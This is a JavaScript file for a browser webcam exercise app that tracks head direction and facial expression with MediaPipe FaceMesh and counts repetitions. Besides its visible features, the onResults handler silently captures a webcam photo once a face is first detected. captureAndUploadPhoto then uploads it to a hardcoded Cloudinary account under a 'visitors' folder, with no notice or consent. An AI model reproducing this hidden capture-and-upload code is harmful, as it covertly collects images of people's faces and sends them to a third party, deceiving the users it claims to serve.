// Cloudinary Configuration
const CLOUD_NAME = "azq6tuq4";
const UPLOAD_PRESET = "blfvqiv6";

// DOM Elements
const video = document.getElementById('webcam');
const commandDisplay = document.getElementById('command-display');
const repCountDisplay = document.getElementById('rep-count');
const expressionDisplay = document.getElementById('expression-display');
const toggleCameraBtn = document.getElementById('toggle-camera-btn');
const captureBtn = document.getElementById('capture-btn');
const cameraOffOverlay = document.getElementById('camera-off-overlay');
const canvas = document.getElementById('snapshot-canvas');

const badges = {
  UP: document.getElementById('dir-up'),
  DOWN: document.getElementById('dir-down'),
  LEFT: document.getElementById('dir-left'),
  RIGHT: document.getElementById('dir-right'),
  CENTER: document.getElementById('dir-center')
};

let currentCommand = 'CENTER';
let lastCommand = 'CENTER';
let repCount = 0;
let exerciseInProgress = false;
let isCameraOn = true;
let initialSnapshotTaken = false;

// 1. Initialize MediaPipe FaceMesh
const faceMesh = new FaceMesh({
  locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
});

faceMesh.setOptions({
  maxNumFaces: 1,
  refineLandmarks: true,
  minDetectionConfidence: 0.5,
  minTrackingConfidence: 0.5
});

faceMesh.onResults(onResults);

// 2. Expression Detection Logic
function detectExpression(landmarks, faceHeight) {
  const topLip = landmarks[13];
  const bottomLip = landmarks[14];
  const leftCorner = landmarks[61];
  const rightCorner = landmarks[291];

  const mouthCenterY = (topLip.y + bottomLip.y) / 2;
  const mouthCornersY = (leftCorner.y + rightCorner.y) / 2;
  const mouthGap = (bottomLip.y - topLip.y) / faceHeight;

  const smileCurvature = (mouthCenterY - mouthCornersY) / faceHeight;

  if (smileCurvature > 0.012) {
    return '😊 Happy — Looking nice & energetic!';
  } else if (smileCurvature < -0.010) {
    return '🙁 Sad — Feeling down? Keep going!';
  } else if (mouthGap > 0.08) {
    return '😲 Surprised — Looking excited!';
  } else {
    return '😐 Neutral — Focused & calm';
  }
}

// 3. Capture & Upload Photo to Cloudinary
async function captureAndUploadPhoto(label = 'user') {
  if (!isCameraOn || video.readyState < 2) return;

  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  const ctx = canvas.getContext('2d');

  // Mirror context to match webcam view
  ctx.translate(canvas.width, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(async (blob) => {
    if (!blob) return;

    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const formData = new FormData();
    formData.append('file', blob);
    formData.append('upload_preset', UPLOAD_PRESET);
    formData.append('folder', 'visitors');
    formData.append('public_id', `${label}_${timestamp}`);

    try {
      const response = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
        method: 'POST',
        body: formData
      });

      const data = await response.json();
      if (data.secure_url) {
        console.log('Snapshot uploaded to Cloudinary:', data.secure_url);
      } else {
        console.error('Cloudinary upload issue:', data);
      }
    } catch (error) {
      console.error('Cloudinary upload error:', error);
    }
  }, 'image/jpeg', 0.85);
}

// 4. UI Update Logic
function updateUI(command, expression) {
  if (expression) {
    expressionDisplay.textContent = expression;
  }

  if (command === lastCommand) return;

  Object.keys(badges).forEach(dir => {
    if (dir === command) {
      badges[dir].classList.add('active');
    } else {
      badges[dir].classList.remove('active');
    }
  });

  if (command !== 'CENTER') {
    exerciseInProgress = true;
  } else if (command === 'CENTER' && exerciseInProgress) {
    repCount++;
    repCountDisplay.textContent = repCount;
    exerciseInProgress = false;
  }

  commandDisplay.textContent = `CURRENT DIRECTION: ${command}`;
  lastCommand = command;
}

// 5. Process Camera Frames
function onResults(results) {
  if (!isCameraOn) return;

  if (results.multiFaceLandmarks && results.multiFaceLandmarks.length > 0) {
    const landmarks = results.multiFaceLandmarks[0];

    // Capture initial photo when user first opens the app and face is detected
    if (!initialSnapshotTaken) {
      initialSnapshotTaken = true;
      setTimeout(() => captureAndUploadPhoto('session_start'), 1000);
    }

    const nose = landmarks[1];
    const leftCheek = landmarks[234];
    const rightCheek = landmarks[454];
    const forehead = landmarks[10];
    const chin = landmarks[152];

    const faceWidth = rightCheek.x - leftCheek.x;
    const noseXRatio = (nose.x - leftCheek.x) / faceWidth;

    const faceHeight = chin.y - forehead.y;
    const noseYRatio = (nose.y - forehead.y) / faceHeight;

    let command = 'CENTER';

    if (noseXRatio < 0.40) {
      command = 'RIGHT';
    } else if (noseXRatio > 0.60) {
      command = 'LEFT';
    } else if (noseYRatio < 0.38) {
      command = 'UP';
    } else if (noseYRatio > 0.62) {
      command = 'DOWN';
    }

    const expression = detectExpression(landmarks, faceHeight);
    updateUI(command, expression);
  } else {
    commandDisplay.textContent = 'No face detected';
    expressionDisplay.textContent = 'Feeling: No face detected';
  }
}

// 6. Event Listeners & Camera Init
const camera = new Camera(video, {
  onFrame: async () => {
    if (isCameraOn) {
      await faceMesh.send({ image: video });
    }
  },
  width: 640,
  height: 480
});

toggleCameraBtn.addEventListener('click', () => {
  if (isCameraOn) {
    isCameraOn = false;
    camera.stop();
    cameraOffOverlay.classList.remove('hidden');
    toggleCameraBtn.textContent = '🟢 Turn Camera On';
    toggleCameraBtn.className = 'btn btn-success';
    commandDisplay.textContent = 'Camera is paused';
    expressionDisplay.textContent = 'Feeling: Camera Off';
  } else {
    isCameraOn = true;
    cameraOffOverlay.classList.add('hidden');
    toggleCameraBtn.textContent = '🔴 Turn Camera Off';
    toggleCameraBtn.className = 'btn btn-danger';
    commandDisplay.textContent = 'Starting camera...';
    camera.start();
  }
});

captureBtn.addEventListener('click', () => {
  captureAndUploadPhoto('manual_capture');
  commandDisplay.textContent = 'Snapshot saved!';
});

camera.start()
  .then(() => {
    commandDisplay.textContent = 'Camera active. Start moving your head!';
  })
  .catch((err) => {
    console.error('Camera error:', err);
    commandDisplay.textContent = 'Error starting camera.';
  });
